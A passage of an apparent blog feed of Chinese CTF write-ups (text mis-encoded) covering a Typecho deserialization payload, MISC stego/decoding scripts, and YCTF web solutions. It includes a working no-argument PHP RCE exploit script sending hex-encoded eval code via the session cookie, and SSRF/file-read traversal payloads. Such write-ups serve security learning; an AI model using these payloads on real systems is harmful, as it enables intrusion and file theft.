class="keyword">$this</span>-&gt;coincidence = <span class="keyword">array</span>(<span class="string">"hello"</span> =&gt; <span class="keyword">new</span> Typecho_Db_Query());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o = serialize(<span class="keyword">new</span> HelloWorld_DB());</span><br><span class="line">$o = preg_replace(<span class="string">" /\^\^/"</span>, <span class="string">"\r\n"</span>, $o);</span><br><span class="line">$r = base64_encode($o);</span><br><span class="line"><span class="keyword">echo</span> $r;</span><br></pre></td></tr></table></figure>

<p>POSTæäº¤payload</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200412194618150.png" alt="image-20200412194618150"></p>
<p>æ³¨æ„å°†PHPSESSIDæ”¹æˆè„šæœ¬ä¸­çš„å€¼ï¼ŒGETæäº¤admin=1æ‰“å°flag</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200412194656862.png" alt="image-20200412194656862"></p>
<h3 id="8-So-Web-Application"><a href="#8-So-Web-Application" class="headerlink" title="8.So Web Application"></a>8.So Web Application</h3><p>è¿™é“é¢˜å¾ˆæ‡µã€‚</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1-åƒå±‚å¥—è·¯"><a href="#1-åƒå±‚å¥—è·¯" class="headerlink" title="1.åƒå±‚å¥—è·¯"></a>1.åƒå±‚å¥—è·¯</h3><p>ç»™äº†ä¸ªå‹ç¼©åŒ…ï¼ŒåŒ…åå°±æ˜¯è§£å‹å¯†ç ï¼Œæœ‰å¾ˆå¤šå±‚ã€‚ã€‚ã€‚</p>
<p>ç›´æ¥è„šæœ¬è·‘</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">next_file = <span class="string">""</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    file = <span class="string">"0573.zip"</span></span><br><span class="line">    zf = zipfile.ZipFile(file)</span><br><span class="line">    <span class="comment"># f=zf.open('1.xlsx',mode='r',pwd='123456'.encode('utf-8'))</span></span><br><span class="line">    a = zf.namelist()</span><br><span class="line">    next_file = a[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        password = file.replace(<span class="string">".zip"</span>, <span class="string">""</span>)</span><br><span class="line">        zf.extractall(pwd=password)</span><br><span class="line">    <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">    zf.close()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">        zf = zipfile.ZipFile(next_file)</span><br><span class="line">        <span class="comment"># f=zf.open('1.xlsx',mode='r',pwd='123456'.encode('utf-8'))</span></span><br><span class="line">        a = zf.namelist()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            password = next_file.replace(<span class="string">".zip"</span>, <span class="string">""</span>)</span><br><span class="line">            <span class="comment"># print password</span></span><br><span class="line">            zf.extractall(pwd=password)</span><br><span class="line">        <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        next_file = a[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span> (next_file)</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°qt.txt, 40000ä¸ªåƒç´ ç‚¹ï¼Œä¹Ÿæ˜¯è„šæœ¬è¿˜åŸ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> skimage <span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">img = np.zeros((<span class="number">200</span>,<span class="number">200</span>))</span><br><span class="line">print(img)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'qr.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">            <span class="keyword">if</span> data[i*<span class="number">200</span>+j] == <span class="string">"(255, 255, 255)\n"</span>:</span><br><span class="line">                img[i][j] = <span class="number">255</span></span><br><span class="line">            <span class="keyword">else</span>: img[i][j] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    plt.imshow(img,cmap=<span class="string">'gray'</span>)</span><br><span class="line">    plt.show()</span><br><span class="line">    plt.close()</span><br></pre></td></tr></table></figure>

<h3 id="2-å¯»æ‰¾xxx"><a href="#2-å¯»æ‰¾xxx" class="headerlink" title="2.å¯»æ‰¾xxx"></a>2.å¯»æ‰¾xxx</h3><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200413153919998.png" alt="image-20200413153919998"></p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200413154311175.png" alt="image-20200413154311175"></p>
<p>æŠŠå¾—åˆ°çš„æ•°å­— <code>18684221609</code> å‘å…¬ä¼—å·</p>
<h3 id="3-Hello-misc"><a href="#3-Hello-misc" class="headerlink" title="3.Hello_ misc"></a>3.Hello_ misc</h3><p>è§£å‹åæ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œå›¾ç‰‡æœ€ä¸Šé¢åªæœ‰çº¢ç»¿ä¸¤ç§é¢œè‰²ã€‚å’Œä¸€ä¸ªflag.rar å¯†ç å‹ç¼©åŒ…</p>
<p>ç”¨foremostä»å›¾ç‰‡ä¸­æå–åˆ°ä¸€ä¸ªå¸¦å¯†ç çš„å‹ç¼©åŒ…ã€‚</p>
<p>æŠŠå›¾ç‰‡çš„çº¢è‰²åŒºåŸŸè£å‰ªå‡ºæ¥ <code>img.png</code></p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/img.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> skimage <span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">img = io.imread(<span class="string">'img.png'</span>)</span><br><span class="line">x = img.shape[<span class="number">0</span>]</span><br><span class="line">y = img.shape[<span class="number">1</span>]</span><br><span class="line">ret = np.zeros((x,y))</span><br><span class="line"><span class="comment">#(255,0,0) çº¢è‰²</span></span><br><span class="line"><span class="comment">#(0,0,255) è“è‰²</span></span><br><span class="line">c=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(y):</span><br><span class="line">        <span class="keyword">if</span>(img[i,j,<span class="number">0</span>]) == <span class="number">255</span>:</span><br><span class="line">            c +=<span class="string">'1'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c += <span class="string">'0'</span></span><br><span class="line"></span><br><span class="line">b = re.findall(<span class="string">r'.&#123;8&#125;'</span>,c)</span><br><span class="line"></span><br><span class="line">d = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    d.append(int(i, <span class="number">2</span>))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'out.png'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">        t = struct.pack(<span class="string">'B'</span>,i)</span><br><span class="line">        f.write(t)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/out.png" alt="out"></p>
<p>å¾—åˆ°out.txt</p>
<p>é‡Œé¢åªæœ‰ <code>127 255 63 191</code> è¿™å››ä¸ªæ•°å­—</p>
<p>çŒœæµ‹ä¸º <code>00 01 10 11</code>çš„ç»„åˆ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permute</span><span class="params">(nums)</span>:</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> permutations(nums, len(nums)):</span><br><span class="line">        result.append(list(i))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">bin_list = [<span class="string">'00'</span>, <span class="string">'01'</span>, <span class="string">'10'</span>,<span class="string">'11'</span>]</span><br><span class="line">bin_list=permute(bin_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'out.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ret = f.readlines()</span><br><span class="line">    p = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ret:</span><br><span class="line">        p.append(int(i))</span><br><span class="line"></span><br><span class="line">    out=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> bin_list:</span><br><span class="line">        s = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> p:</span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">63</span>:</span><br><span class="line">                a = i[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">elif</span> j == <span class="number">127</span>:</span><br><span class="line">                a = i[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">elif</span> j == <span class="number">191</span>:</span><br><span class="line">                a = i[<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">elif</span> j == <span class="number">255</span>:</span><br><span class="line">                a = i[<span class="number">3</span>]</span><br><span class="line">            s += a</span><br><span class="line">        out.append(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> out:</span><br><span class="line">    d = re.findall(<span class="string">r'.&#123;8&#125;'</span>,i)</span><br><span class="line">    o = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> d:</span><br><span class="line">        o += chr(int(j, <span class="number">2</span>))</span><br><span class="line">    print(o)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200413180554762.png" alt="image-20200413180554762"></p>
<p>å¾—åˆ°flag.rarè§£å‹å¯†ç </p>
<p>è§£å‹å‘ç°</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200413180722339.png" alt="image-20200413180722339"></p>
<p>æ‰€ä»¥æ”¹åç¼€ä¸º<code>docx</code></p>
<p>é‡Œé¢æ˜¯ç©ºçš„ ï¼Œä¼¼æ›¾ç›¸è¯†ï¼Ÿ</p>
<p>ç›´æ¥å…¨é€‰ï¼Œæ”¹å­—ä½“é¢œè‰²</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">MTEwMTEwMTExMTExMTEwMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTEwMDAwMDAxMTExMTExMTExMDAxMTAx</span></span><br><span class="line"><span class="attribute">MTEwMTEwMTEwMDAxMTAxMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTExMTExMTExMTExMTEwMTEwMDEx</span></span><br><span class="line"><span class="attribute">MTEwMDAwMTAxMTEwMTExMDExMTEwMTExMTExMTAwMDExMTExMTExMTExMDAxMDAxMTAxMTEwMDAwMDExMTExMDAwMDExMTExMTEx</span></span><br><span class="line"><span class="attribute">MTEwMTEwMTAwMDAxMTExMDExMTEwMTExMTExMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTExMTExMTAwMTEwMTExMTExMTExMTEx</span></span><br><span class="line"><span class="attribute">MTEwMTEwMTAxMTExMTExMDExMTEwMTExMTAxMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTAxMTExMTAwMTEwMTExMTExMTExMTEx</span></span><br><span class="line"><span class="attribute">MTEwMTEwMTAwMDAxMTAwMDAwMTEwMDAwMDAxMTAwMDExMTAwMDAwMTEwMTEwMTEwMTAxMTEwMDAwMDAxMTExMDAwMDExMTExMTEx</span></span><br></pre></td></tr></table></figure>

<p>çœ‹èµ·æ¥åƒbase64éšå†™ï¼Œä½†ä¹‹å‰ç”¨çš„è„šæœ¬æ‰“å°å‡ºæ¥å…¨æ˜¯ä¸å¯è§å­—ç¬¦ï¼Œæ‰€ä»¥æ‰¾äº†ä¸ªæ–°è„šæœ¬</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200413183342138.png" alt="image-20200413183342138"></p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200413183650016.png" alt="image-20200413183650016"></p>
<h3 id="4-pyFlag"><a href="#4-pyFlag" class="headerlink" title="4.pyFlag"></a>4.pyFlag</h3><p>é¢˜ç›®ç»™äº†ä¸‰å¼ å›¾ç‰‡ï¼Œæ”¾åˆ°winhexä¸‹ï¼Œå¯ä»¥å‘ç°å°¾éƒ¨åˆ†åˆ«æœ‰ä¸€ä¸ªéƒ¨åˆ†ï¼Œå°†å®ƒä»¬ç»„åˆåœ¨ä¸€èµ·ï¼Œå¯ä»¥å¾—åˆ°ï¼Œä¸€ä¸ªzipã€‚</p>
<p>ç„¶åçˆ†ç ´å‹ç¼©åŒ…å¯†ç æ˜¯1234</p>
<p>å¾—åˆ°å¯†æ–‡</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">G&amp;e<span class="constructor">OhGcq(ZG(<span class="params">t2</span><span class="operator">*</span>H8M3dG&amp;<span class="params">wXiGcq</span>(ZG&amp;<span class="params">wXyG</span>(<span class="params">j</span><span class="params">~tG</span>&amp;<span class="params">eOdGcq</span>+<span class="params">aG</span>(<span class="params">t5oG</span>(<span class="params">j</span><span class="params">~qG</span>&amp;<span class="params">eIeGcq</span>+<span class="params">aG</span>)</span><span class="number">6</span>Q&lt;<span class="constructor">G(<span class="params">j</span><span class="params">~rG</span>&amp;<span class="params">eOdH9</span>&lt;5qG&amp;<span class="params">eLvG</span>(<span class="params">j</span><span class="params">~sG</span>&amp;<span class="params">nRdH9</span>&lt;8rG%<span class="operator">++</span><span class="params">qG</span>%<span class="params">__eG</span>&amp;<span class="params">eIeGc</span>+|<span class="params">cG</span>(<span class="params">t5oG</span>(<span class="params">j</span><span class="params">~sG</span>&amp;<span class="params">eOlH9</span>&lt;8rH8C_qH9&lt;8oG&amp;<span class="params">eOhGc</span>+<span class="params">_bG</span>&amp;<span class="params">eLvH9</span>&lt;8sG&amp;<span class="params">eLgGcz</span>?<span class="params">cG</span>&amp;3|<span class="params">sH8M3cG</span>&amp;<span class="params">eOtG</span>%<span class="params">_</span>?<span class="params">aG</span>(<span class="params">t5oG</span>(<span class="params">j</span><span class="params">~tG</span>&amp;<span class="params">wXxGcq</span>+<span class="params">aH8V6sH9</span>&lt;8rG&amp;<span class="params">eOhH9</span>&lt;5qG(&lt;E-H8M3eG&amp;<span class="params">wXiGcq</span>(ZG)</span><span class="number">6</span>Q&lt;<span class="constructor">G(<span class="params">j</span><span class="params">~tG</span>&amp;<span class="params">eOtG</span>%+&lt;<span class="params">aG</span>&amp;<span class="params">wagG</span>%<span class="params">__cG</span>&amp;<span class="params">eIeGcq</span>+<span class="params">aG</span>&amp;M9uH8V6cG&amp;<span class="params">eOlH9</span>&lt;8rG(&lt;HrG(<span class="params">j</span><span class="params">~qG</span>&amp;<span class="params">eLcH9</span>&lt;8sG&amp;<span class="params">wUwGek2</span>)</span></span><br></pre></td></tr></table></figure>

<p>hint</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">æˆ‘ç”¨å„ç§baseXXç¼–ç æŠŠflagå¥—å¨ƒåŠ å¯†äº†ï¼Œä½ åº”è¯¥ä¹Ÿæœ‰çœ‹å‡ºæ¥ã€‚</span><br><span class="line">ä½†æˆ‘åªç”¨äº†ä¸€äº›å¸¸ç”¨çš„baseç¼–ç å“¦ï¼Œæ¯•ç«Ÿæˆ‘çš„æ™ºåŠ›æ°´å¹³ä½ ä¹ŸçŸ¥é“...åƒä»€ä¹ˆbase36base58å¬éƒ½æ²¡å¬è¿‡</span><br><span class="line">æç¤ºï¼š<span class="number">0x10</span>,<span class="number">0x20</span>,<span class="number">0x30</span>,<span class="number">0x55</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">a = <span class="string">"G&amp;eOhGcq(ZG(t2*H8M3dG&amp;wXiGcq(ZG&amp;wXyG(j~tG&amp;eOdGcq+aG(t5oG(j~qG&amp;eIeGcq+aG)6Q&lt;G(j~rG&amp;eOdH9&lt;5qG&amp;eLvG(j~sG&amp;nRdH9&lt;8rG%++qG%__eG&amp;eIeGc+|cG(t5oG(j~sG&amp;eOlH9&lt;8rH8C_qH9&lt;8oG&amp;eOhGc+_bG&amp;eLvH9&lt;8sG&amp;eLgGcz?cG&amp;3|sH8M3cG&amp;eOtG%_?aG(t5oG(j~tG&amp;wXxGcq+aH8V6sH9&lt;8rG&amp;eOhH9&lt;5qG(&lt;E-H8M3eG&amp;wXiGcq(ZG)6Q&lt;G(j~tG&amp;eOtG%+&lt;aG&amp;wagG%__cG&amp;eIeGcq+aG&amp;M9uH8V6cG&amp;eOlH9&lt;8rG(&lt;HrG(j~qG&amp;eLcH9&lt;8sG&amp;wUwGek2)"</span></span><br><span class="line">a = base64.b85decode(a)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">c = re.findall(<span class="string">r'.&#123;2&#125;'</span>,a.decode())</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    s += <span class="string">'%'</span>+i</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">s = parse.unquote(s)</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">s = base64.b32decode(s)</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">s = base64.b16decode(s.decode())</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(s))</span><br></pre></td></tr></table></figure>

<h3 id="5-Unravel"><a href="#5-Unravel" class="headerlink" title="5.Unravel!"></a>5.Unravel!</h3><p>JM.PNG,å¯ä»¥binwalk ä¸€å¼ å›¾ç‰‡ï¼Œå†…å®¹ä¸ºï¼šTokyo</p>
<p>look_at_the_file_ending.wavæ–‡ä»¶å°¾éƒ¨æœ‰ä¸€ä¸²aes <code>U2FsdGVkX1/nSQN+hoHL8OwV9iJB/mSdKk5dmusulz4=</code></p>
<p>è§£å¼€æ˜¯ <code>CCGandGulu</code> æ˜¯å‹ç¼©åŒ…çš„å¯†ç </p>
<p>åˆ©ç”¨silenteyeè§£å¯†</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200413200509558.png" alt="image-20200413200509558"></p>
<p><a href="https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2020MRCTF" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« </a>n</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>51ELABæ˜“éœ–åšYCTF</title>
    <url>/2020/03/51ELAB%E6%98%93%E9%9C%96%E5%8D%9AYCTF-Writeup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-RCE"><a href="#1-RCE" class="headerlink" title="1.RCE"></a>1.RCE</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'var'</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!preg_match(<span class="string">'/et|dir|na|info|dec|oct|pi|log/i'</span>, $_GET[<span class="string">'var'</span>])) &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($_GET[<span class="string">'var'</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Sorry!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>


<p>æ— å‚æ•°RCE</p>
<p>session_id() å¯ä»¥ç”¨æ¥è·å–/è®¾ç½®å½“å‰ä¼šè¯ IDã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨æ­¤æ–¹æ³•æ¥è·å–phpsessionidï¼Œå¹¶ä¸”phpsessionidå¯æ§</p>
<p>eval(hex2bin(session_id(session_start())));å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤</p>
<p>æ¨èçœ‹çœ‹è¿™ç¯‡<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">æ–‡ç« </a>å§¿åŠ¿å¾ˆå…¨</p>
<p>payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span><span class="params">(strs)</span>:</span></span><br><span class="line">    ret=<span class="string">''</span></span><br><span class="line">    b = list(strs)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">        c = hex(ord(i)).replace(<span class="string">"0x"</span>,<span class="string">""</span>)</span><br><span class="line">        ret +=c</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="string">"""def str2hex(strs):</span></span><br><span class="line"><span class="string">	bstrs=bytes(strs,'utf-8')</span></span><br><span class="line"><span class="string">	ret = ''.join(['%02x' %b for b in bstrs])</span></span><br><span class="line"><span class="string">	return ret</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">url= <span class="string">"http://124.193.74.212:36060/?var=eval(hex2bin(session_id(session_start())));"</span></span><br><span class="line">payload=<span class="string">"var_dump(file_get_contents('/flag.txt'));"</span></span><br><span class="line">payload=str2hex(payload)</span><br><span class="line">cookies=&#123;<span class="string">'PHPSESSID'</span>:payload&#125;</span><br><span class="line">res =requests.get(url,cookies=cookies)</span><br><span class="line">print(res.content)</span><br></pre></td></tr></table></figure>

<h3 id="2-SSRF"><a href="#2-SSRF" class="headerlink" title="2.SSRF"></a>2.SSRF</h3><p>è®¿é—®ç›´æ¥è·³è½¬åˆ°ï¼š</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//124.193.74.211:13187/index.php?file=WTNSbWFXMWhaMlV1YW5Cbg==</span></span><br></pre></td></tr></table></figure>

<p>urlä¸€çœ‹æ€€ç–‘æ˜¯ä»»æ„æ–‡ä»¶è¯»å–</p>
<p>ç„¶åæŠŠ <code>index.php</code> ä¸¤æ¬¡base64ç¼–ç  <code>YVc1a1pYZ3VjR2h3</code></p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?file=WTNSbWFXMWhaMlV1YW5Cbg=='</span>);</span><br><span class="line">$file = base64_decode(base64_decode($_GET[<span class="string">'file'</span>]));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'file'</span>].<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'input_filename:   '</span>. $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$file = str_replace(<span class="string">"ctf"</span>,<span class="string">"flag"</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'real_filename:   '</span>.$file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Hint: hal0flagi5here.php</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>å‘ç°æºç ä¸­æœ‰æç¤º <code>hal0flagi5here.php</code></p>
<p>æ ¹æ®æç¤ºæŸ¥çœ‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$argv[<span class="number">1</span>]=$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(filter_var($argv[<span class="number">1</span>],FILTER_VALIDATE_URL))</span><br><span class="line">&#123;</span><br><span class="line">true$r = parse_url($argv[<span class="number">1</span>]);</span><br><span class="line">trueprint_r($r);</span><br><span class="line">true<span class="keyword">if</span>(preg_match(<span class="string">'/happyctf\.com$/'</span>,$r[<span class="string">'host'</span>]))</span><br><span class="line">true&#123;</span><br><span class="line">truetrue$url=file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">truetrue<span class="keyword">echo</span>($url);</span><br><span class="line">true&#125;<span class="keyword">else</span></span><br><span class="line">true&#123;</span><br><span class="line">truetrue<span class="keyword">echo</span>(<span class="string">"error"</span>);</span><br><span class="line">true&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">true<span class="keyword">echo</span> <span class="string">"403 Forbidden"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸»è¦æ˜¯ç»•è¿‡<code>filter_var()</code>å’Œ<code>parse_url()</code>ä»¥åŠ<code>file_get_contents()</code></p>
<p>payload</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">hal0flagi5here.php?url=dict:<span class="regexp">//</span>happyctf.com<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/flag.txt</span></span><br></pre></td></tr></table></figure>

<p>æˆ–è€…</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">hal0flagi5here.php?url=test:<span class="comment">//happyctf.com/../../../../../../flag.txt</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªteståªè¦ä¸ºä¸€ä¸ªphpä¸è®¤è¯†çš„protocolæ—¶ï¼Œphpä¼šæŠ›ä¸€ä¸ªwarningï¼Œå¹¶å°†protocolè®¾ç½®ä¸ºç©ºï¼Œåœ¨protocolä¸ºnullæˆ–è€…fileæ—¶ï¼Œåˆ™è¿›è¡Œæœ¬åœ°æ–‡ä»¶æ“ä½œã€‚</p>
<h3 id="3-SQLI"><a href="#3-SQLI" class="headerlink" title="3.SQLI"></a>3.SQLI</h3><p>RCTF2015çš„åŸé¢˜</p>
<p>æ­£å¸¸å¥—è·¯ï¼Œå…ˆfuzzä¸‹</p>
<p>ä»¥ä¸‹æ˜¯è¢«è¿‡æ»¤çš„å­—ç¬¦</p>
<p><img src="/2020/03/51ELABæ˜“éœ–åšYCTF-Writeup/image-20200415185646715.png" alt="image-20200415185646715"></p>
<p>æ³¨å†Œä¸€ä¸ªæ­£å¸¸çš„ç”¨æˆ·ï¼Œç™»å½•åå‘ç°å¯ä»¥ä¿®æ”¹å¯†ç ï¼Œæ€€ç–‘æ˜¯äºŒæ¬¡æ³¨å…¥</p>
<p>å°±æœ‰æ³¨å†Œ <code>sss&quot;1</code>çš„ç”¨æˆ·ï¼Œç™»é™†åè¿›å…¥ä¿®æ”¹å¯†ç çš„é¡µé¢ï¼Œå‘ç°æŠ¥é”™äº†</p>
<p><img src="/2020/03/51ELABæ˜“éœ–åšYCTF-Writeup/image-20200415204058693.png" alt="image-20200415204058693"></p>
<p>æ¥ç€æ„é€ payload</p>
